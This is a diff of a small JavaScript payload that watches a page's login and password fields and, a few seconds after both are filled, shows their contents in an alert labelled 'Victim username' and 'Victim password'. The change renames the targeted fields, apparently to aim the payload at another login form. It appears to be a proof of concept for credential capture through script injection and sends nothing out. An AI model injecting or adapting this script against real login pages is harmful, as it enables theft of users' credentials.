@@ -1,14 +1,14 @@
 let isFilled = false;
 
  function checkInputs() {
-    const input1 = document.getElementsByName('UserName')[0];
-    const input2 = document.getElementsByName('UserPass')[0];
+    const input1 = document.getElementsByName('in_userlogin')[0];
+    const input2 = document.getElementsByName('in_password')[0];
 
     if (input1.value && input2.value) {
       if (!isFilled) {
         isFilled = true; 
         setTimeout(function() {
-          alert('Victim username: '+document.getElementsByName('UserName')[0].value+'\n\nVictim password: '+document.getElementsByName('UserPass')[0].value);
+          alert('Victim username: '+document.getElementsByName('in_userlogin')[0].value+'\n\nVictim password: '+document.getElementsByName('in_password')[0].value);
          
         }, 4500); 
       }
@@ -19,6 +19,6 @@ let isFilled = false;
   window.onload = checkInputs;
 
 
-  document.getElementsByName('UserName')[0].addEventListener('input', checkInputs);
-  document.getElementsByName('UserPass')[0].addEventListener('input', checkInputs);
+  document.getElementsByName('in_userlogin')[0].addEventListener('input', checkInputs);
+  document.getElementsByName('in_password')[0].addEventListener('input', checkInputs);
 
